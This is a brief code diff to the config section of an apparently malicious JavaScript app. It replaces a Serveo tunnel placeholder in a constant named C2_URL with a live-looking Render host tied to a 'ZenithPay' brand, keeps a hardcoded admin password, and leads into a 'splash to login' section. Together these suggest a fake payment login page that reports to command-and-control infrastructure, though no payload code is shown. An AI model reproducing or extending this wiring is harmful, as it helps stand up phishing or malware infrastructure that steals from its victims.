@@ -1,5 +1,5 @@
 // ============ CONFIG ============
-const C2_URL = 'https://your-serveo-url.serveousercontent.com';
+const C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
 const ADMIN_PASSWORD = 'ZENITH2026';
 
 // ============ SPLASH TO LOGIN ============
